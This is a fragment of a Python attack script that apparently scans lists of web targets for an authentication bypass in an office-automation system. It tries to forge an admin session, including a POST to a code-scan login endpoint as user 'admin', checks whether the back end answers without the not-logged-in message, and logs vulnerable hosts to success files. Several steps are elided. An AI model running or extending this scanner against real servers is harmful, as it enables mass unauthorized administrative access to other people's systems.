...
def getV11Session(url, i):
    print(f'[+++]Now,url\'s the number is {i}')
    ...
    try:
        ...
        url_g = url + '/general'
        rs = requests.get(url_g, cookies=cookies, headers=headers, timeout=3)  # 再请求一遍目标后台

        if '用户未登录' not in rs.text:
            print('[+++]The {url} has Vuln V11 !!!'.format(url=url) + '\n')
            with open('success.txt', 'a') as f1:
                f1.write(url + '\n')
    except:
        get2017Session(url, i)


def get2017Session(url, i):
    ...
    try:
        ...
        res = requests.post(codeScanUrl, data={'codeuid': codeUid, 'uid': int(1), 'source': 'pc', 'type': 'confirm',
                                               'username': 'admin'}, headers=headers, timeout=10)
        resText = json.loads(res.text)
        status = resText['status']
        if status == str(1):
            print_fuck(f'[---]The {url} has hole!!!2017' + '\n')
            with open('success_2017.txt', 'a') as f:
                f.write(url + '\n')
        else:
            pass
    except:
